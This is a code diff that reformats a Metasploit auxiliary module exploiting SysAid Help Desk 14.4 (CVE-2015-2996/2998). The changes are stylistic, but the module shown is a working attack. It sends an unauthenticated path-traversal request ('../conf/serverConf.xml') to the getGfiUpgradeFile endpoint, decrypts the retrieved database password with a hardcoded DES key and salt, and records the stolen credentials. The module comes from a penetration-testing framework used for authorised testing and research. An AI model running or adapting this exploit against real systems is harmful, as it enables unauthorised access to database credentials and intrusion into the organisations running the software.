@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,42 +8,41 @@ require 'msf/core'
 require 'openssl'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'SysAid Help Desk Database Credentials Disclosure',
-      'Description' => %q{
-        This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated
-        user to download arbitrary files from the system. This is used to download the server
-        configuration file that contains the database username and password, which is encrypted
-        with a fixed, known key. This module has been tested with SysAid 14.4 on Windows and Linux.
-        },
-      'Author' =>
-        [
-          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
-        ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
-          ['CVE', '2015-2996'],
-          ['CVE', '2015-2998'],
-          ['URL', 'http://seclists.org/fulldisclosure/2015/Jun/8'],
-          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt']
-        ],
-      'DisclosureDate' => 'Jun 3 2015'))
+                      'Name' => 'SysAid Help Desk Database Credentials Disclosure',
+                      'Description' => %q(
+                        This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated
+                        user to download arbitrary files from the system. This is used to download the server
+                        configuration file that contains the database username and password, which is encrypted
+                        with a fixed, known key. This module has been tested with SysAid 14.4 on Windows and Linux.
+                        ),
+                      'Author' =>
+                        [
+                          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
+                        ],
+                      'License' => MSF_LICENSE,
+                      'References' =>
+                        [
+                          ['CVE', '2015-2996'],
+                          ['CVE', '2015-2998'],
+                          ['URL', 'http://seclists.org/fulldisclosure/2015/Jun/8'],
+                          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt']
+                        ],
+                      'DisclosureDate' => 'Jun 3 2015'))
 
     register_options(
       [
         OptPort.new('RPORT', [true, 'The target port', 8080]),
-        OptString.new('TARGETURI', [ true, 'SysAid path', '/sysaid']),
-      ], self.class)
+        OptString.new('TARGETURI', [ true, 'SysAid path', '/sysaid'])
+      ], self.class
+    )
   end
 
-
-  def decrypt_password (ciphertext)
+  def decrypt_password(ciphertext)
     salt = [-87, -101, -56, 50, 86, 53, -29, 3].pack('c*')
     cipher = OpenSSL::Cipher::Cipher.new("DES")
     base_64_code = Rex::Text.decode_base64(ciphertext)
@@ -56,13 +56,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     begin
-      res = send_request_cgi({
-        'method' => 'GET',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'getGfiUpgradeFile'),
-        'vars_get' => {
-          'fileName' => '../conf/serverConf.xml'
-        },
-      })
+      res = send_request_cgi('method' => 'GET',
+                             'uri' => normalize_uri(datastore['TARGETURI'], 'getGfiUpgradeFile'),
+                             'vars_get' => {
+                               'fileName' => '../conf/serverConf.xml'
+                             })
     rescue Rex::ConnectionRefused
       fail_with(Failure::Unreachable, "#{peer} - Could not connect.")
     end
@@ -82,10 +80,8 @@ class MetasploitModule < Msf::Auxiliary
       database_url = database_url.captures[0]
       database_type = database_type.captures[0]
       password = decrypt_password(encrypted_password[6..encrypted_password.length])
-      credential_core = report_credential_core({
-        password: password,
-        username: username
-      })
+      credential_core = report_credential_core(password: password,
+                                               username: username)
 
       matches = /(\w*):(\w*):\/\/(.*)\/(\w*)/.match(database_url)
       if matches
@@ -127,8 +123,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
-  def report_credential_core(cred_opts={})
+  def report_credential_core(cred_opts = {})
     origin_service_data = {
       address: rhost,
       port: rport,
@@ -139,7 +134,7 @@ class MetasploitModule < Msf::Auxiliary
 
     credential_data = {
       origin_type: :service,
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       private_type: :password,
       private_data: cred_opts[:password],
       username: cred_opts[:username]
